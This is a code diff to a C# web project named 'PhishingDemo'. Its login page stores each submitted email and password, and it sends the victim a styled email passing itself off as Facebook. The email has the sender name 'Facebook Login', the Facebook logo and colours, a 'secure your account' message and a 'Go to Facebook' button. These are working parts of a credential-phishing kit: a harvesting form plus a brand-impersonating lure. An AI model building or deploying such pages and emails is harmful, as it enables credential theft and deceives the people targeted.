@@ -21,6 +21,8 @@ namespace PhishingDemo.Pages
         public string Email { get; set; } = string.Empty;
         [BindProperty]
         public string Password { get; set; } = string.Empty;
+        [BindProperty]
+        public string SuccessClass { get; set; } = string.Empty;
 
         public void OnGet()
         {
@@ -30,7 +32,7 @@ namespace PhishingDemo.Pages
         {
             BCS controlls = new BCS();
             controlls.AddUser(Email, Password);
-
+            SuccessClass = "success-message";
             // Call method to send email
             await SendLoginEmailAsync(Email);
         }
@@ -46,11 +48,55 @@ namespace PhishingDemo.Pages
                 var message = new SendGridMessage
                 {
                     From = new EmailAddress("ekwomnick@gmail.com", "Facebook Login"),
-                    Subject = "Login Notification",
-                    PlainTextContent = "You have successfully logged in!",
-                    HtmlContent = "<strong>You have successfully logged in!</strong>"
+                    Subject = "Confirm Email",
+                    HtmlContent = @"
+                                    <html>
+                                    <head>
+                                        <style>
+                                            .container {
+                                                max-width: 600px;
+                                                margin: auto;
+                                                padding: 20px;
+                                                border: 1px solid #ddd;
+                                                border-radius: 10px;
+                                                font-family: Arial, sans-serif;
+                                            }
+                
+                                            .logo {
+                                                width: 150px;
+                                                margin: 0 auto 20px;
+                                            }
+                
+                                            .message {
+                                                font-size: 16px;
+                                                color: #333;
+                                            }
+                
+                                         
+                                            .button {
+                                                display: block;
+                                                width: 200px;
+                                                margin: 20px auto;
+                                                padding: 10px 20px;
+                                                background-color: #3b5998;
+                                                color: white;
+                                                text-align: center;
+                                                text-decoration: none;
+                                                border-radius: 5px;
+                                            }
+                                        </style>
+                                    </head>
+                                    <body>
+                                        <div class='container'>
+                                            <img class='logo' src='https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg' alt='Facebook Logo'>
+                                            <p class='message'>You are One Step Closer to Securing your Account Click the Link to Verify Profile</p>
+                                            <a class='button' href='#'>Go to Facebook</a>
+                                        </div>
+                                    </body>
+                                    </html>"
                 };
                 message.AddTo(new EmailAddress(userEmail));
+
 
                 // Send the email
                 var response = await client.SendEmailAsync(message);
